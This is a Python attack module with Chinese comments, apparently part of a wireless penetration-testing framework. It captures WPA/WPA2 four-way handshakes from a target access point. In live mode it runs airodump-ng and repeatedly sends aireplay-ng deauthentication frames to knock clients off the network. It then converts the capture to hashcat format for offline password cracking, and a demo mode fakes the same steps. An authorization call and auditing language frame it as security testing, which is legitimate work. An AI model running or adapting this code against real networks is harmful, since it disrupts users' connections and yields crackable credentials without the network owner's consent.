"""WPA/WPA2 四次握手捕获（配合 Deauth 加速）."""

from __future__ import annotations

import asyncio
import random
import time
from pathlib import Path

from .base import AttackContext, AttackModule, AttackResult, Option
from ..crack.offline import make_handshake_line
from ..crack.tools import convert_to_22000, count_handshakes
from ..models import normalize_mac
from ..recon.demo import demo_psk


class HandshakeCapture(AttackModule):
    id = "handshake"
    name = "四次握手捕获"
    category = "credential"
    description = (
        "锁定目标 BSSID 与信道后抓取 EAPOL 四次握手，并周期性发送 Deauth 促使客户端重连。"
        "抓到 M1+M2 后即可离线校验口令强度。"
    )
    requires = ("airodump-ng", "aireplay-ng", "aircrack-ng")
    risk = "high"
    needs_monitor = True
    options = [
        Option("timeout", "最大等待（秒）", "int", 120, "超过该时间仍未捕获则结束"),
        Option("deauth_interval", "Deauth 间隔（秒）", "int", 15, "周期性踢客户端以触发重连"),
        Option("deauth", "启用 Deauth", "bool", True, "关闭后仅被动等待"),
        Option("target_client", "只踢指定客户端", "mac", "", "留空表示广播"),
    ]

    def validate(self, params: dict) -> list[str]:
        issues = super().validate(params)
        security = (params.get("security") or "").upper()
        if security in {"OPEN", "WEP"}:
            issues.append("开放/WEP 网络没有四次握手，请改用 WEP 攻击或直接接入")
        return issues

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        bssid = normalize_mac(params["bssid"])
        ssid = params.get("ssid", "")
        channel = int(params.get("channel") or 0)
        timeout = max(10, int(params.get("timeout") or 120))
        interval = max(5, int(params.get("deauth_interval") or 15))
        do_deauth = bool(params.get("deauth", True))
        target_client = params.get("target_client") or ""
        ctx.authorize("handshake", bssid, ssid)

        security = (params.get("security") or "").upper()
        if security in {"WPA3", "WPA3-ENT"} and "WPA2" not in security:
            ctx.emit("warning", "目标是纯 WPA3，四次握手不存在；请使用 WPA3 降级或在线猜测")
            return AttackResult(
                ok=False,
                summary="纯 WPA3 目标不支持四次握手捕获，请改用「WPA3 过渡模式降级」",
                detail={"security": security},
                duration=time.time() - started,
            )

        ctx.emit(
            "attack",
            f"开始捕获握手：{ssid or '<隐藏>'} · {bssid} · ch{channel} · 最长 {timeout}s",
            bssid=bssid,
        )

        if ctx.demo:
            return await self._demo(ctx, params, bssid, ssid, channel, timeout, started)

        return await self._live(
            ctx, params, bssid, ssid, channel, timeout, interval, do_deauth, target_client, started
        )

    # ------------------------------------------------------------------ demo
    async def _demo(
        self,
        ctx: AttackContext,
        params: dict,
        bssid: str,
        ssid: str,
        channel: int,
        timeout: int,
        started: float,
    ) -> AttackResult:
        psk = demo_psk(ssid)
        if not psk:
            ctx.emit("warning", f"演示目标 {ssid} 没有可用 PSK（可能是开放/企业网络）")
            return AttackResult(
                ok=False,
                summary="该演示目标不适用握手捕获（无 PSK）",
                duration=time.time() - started,
            )
        steps = [
            "锁定信道并启动 airodump-ng（模拟）",
            "发送 Deauth 促使客户端重连（模拟）",
            "捕获到 EAPOL M1 (AP → STA)",
            "捕获到 EAPOL M2 (STA → AP)",
            "握手校验通过：M1+M2 完整",
        ]
        for step in steps:
            await asyncio.sleep(0.55)
            ctx.emit("info", step, bssid=bssid)

        rng = random.Random(bssid)
        anonce = bytes(rng.getrandbits(8) for _ in range(32))
        snonce = bytes(rng.getrandbits(8) for _ in range(32))
        sta = "3c:07:54:%02x:%02x:%02x" % tuple(rng.randint(0, 255) for _ in range(3))
        line = make_handshake_line(psk, ssid, bssid, sta, anonce, snonce)
        path = ctx.capture_path("handshake", bssid, "22000")
        path.write_text(line + "\n", encoding="utf-8")

        capture_id = ctx.register_capture(
            "handshake",
            path,
            bssid=bssid,
            ssid=ssid,
            meta={
                "demo": True,
                "type": "eapol-mic",
                "client": sta,
                "channel": channel,
                "note": "演示模式生成的真实可校验 22000 哈希（type 02）",
            },
        )
        ctx.finding(
            "捕获到 WPA 四次握手",
            "high",
            bssid=bssid,
            ssid=ssid,
            detail="已获得可用于离线口令校验的完整握手（M1+M2）。",
            category="capture",
        )
        return AttackResult(
            ok=True,
            summary=f"握手捕获成功（模拟，客户端 {sta}），已生成可校验哈希",
            detail={"demo": True, "client": sta, "channel": channel, "path": str(path)},
            capture_id=capture_id,
            duration=time.time() - started,
        )

    # ------------------------------------------------------------------ live
    async def _live(
        self,
        ctx: AttackContext,
        params: dict,
        bssid: str,
        ssid: str,
        channel: int,
        timeout: int,
        interval: int,
        do_deauth: bool,
        target_client: str,
        started: float,
    ) -> AttackResult:
        monitor = await ctx.monitor()
        await ctx.set_channel(channel)
        prefix = str(ctx.capture_path("handshake", bssid, "cap")).removesuffix(".cap")
        args = [
            "airodump-ng",
            "--bssid", bssid,
            "-c", str(channel),
            "--write", prefix,
            "--output-format", "pcap,csv",
            "--write-interval", "1",
            monitor,
        ]
        proc = await ctx.runner.background(args, delay=2.0, on_line=lambda line: ctx.log(line))
        cap_path = Path(prefix + "-01.cap")
        last_deauth = 0.0
        found = False
        ctx.emit("info", f"airodump-ng 已启动，抓包文件: {cap_path.name}")

        try:
            while time.time() - started < timeout:
                await asyncio.sleep(2)
                if time.time() - last_deauth >= interval and do_deauth:
                    last_deauth = time.time()
                    cmd = ["aireplay-ng", "--deauth", "8", "-a", bssid]
                    if target_client:
                        cmd += ["-c", normalize_mac(target_client)]
                    cmd += ["--ignore-negative-one", monitor]
                    await ctx.runner.run(cmd, timeout=15)
                    ctx.emit("info", "已发送一轮 Deauth，等待客户端重连…")
                if cap_path.exists() and cap_path.stat().st_size > 0:
                    count = await count_handshakes(ctx.runner, cap_path)
                    if count >= 1:
                        found = True
                        ctx.emit("success", f"检测到 {count} 个握手！")
                        break
        finally:
            await ctx.runner.terminate(proc)

        if not found:
            ctx.emit("warning", f"{timeout}s 内未捕获到握手，可尝试延长等待或确认客户端在线")
            return AttackResult(
                ok=False,
                summary=f"未在 {timeout}s 内捕获握手（抓包保留在 {cap_path.name}）",
                detail={"path": str(cap_path), "timeout": timeout},
                duration=time.time() - started,
            )

        await ctx.runner.terminate(proc)
        capture_id = ctx.register_capture(
            "handshake",
            cap_path,
            bssid=bssid,
            ssid=ssid,
            meta={"channel": channel, "client": target_client or "any"},
        )
        # 同步转换一份 22000，方便 hashcat
        hash_path = ctx.capture_path("handshake", bssid, "22000")
        ok, lines, note = await convert_to_22000(ctx.runner, cap_path, hash_path)
        if ok:
            ctx.register_capture(
                "handshake", hash_path, bssid=bssid, ssid=ssid, meta={"converted": True}
            )
            ctx.emit("success", f"已转换为 hashcat 22000（{lines} 条）")
        ctx.finding(
            "捕获到 WPA 四次握手",
            "high",
            bssid=bssid,
            ssid=ssid,
            detail=f"抓包 {cap_path.name}；可直接用于离线字典校验。",
            category="capture",
        )
        return AttackResult(
            ok=True,
            summary=f"握手捕获成功，抓包 #{capture_id}",
            detail={"path": str(cap_path), "hash_path": str(hash_path) if ok else ""},
            capture_id=capture_id,
            duration=time.time() - started,
        )
